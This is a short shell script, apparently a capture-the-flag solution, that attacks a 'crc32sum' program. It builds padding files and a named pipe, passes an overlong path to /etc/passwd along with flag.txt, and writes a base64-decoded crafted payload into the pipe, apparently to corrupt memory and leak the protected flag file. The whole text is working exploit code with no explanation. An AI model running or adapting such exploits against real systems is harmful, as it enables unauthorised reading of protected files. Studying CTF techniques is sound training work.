echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
  > /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

mkfifo /tmp/hoge

crc32sum \
  /////////////////////////////////////////////////////////////////////////////////////////etc/passwd \
  /tmp/hoge \
  /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
  /tmp/hoge \
  flag.txt \
  flag.txt &

echo A > /tmp/hoge
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoQAAAAAAAAAQ | base64 -d > /tmp/hoge
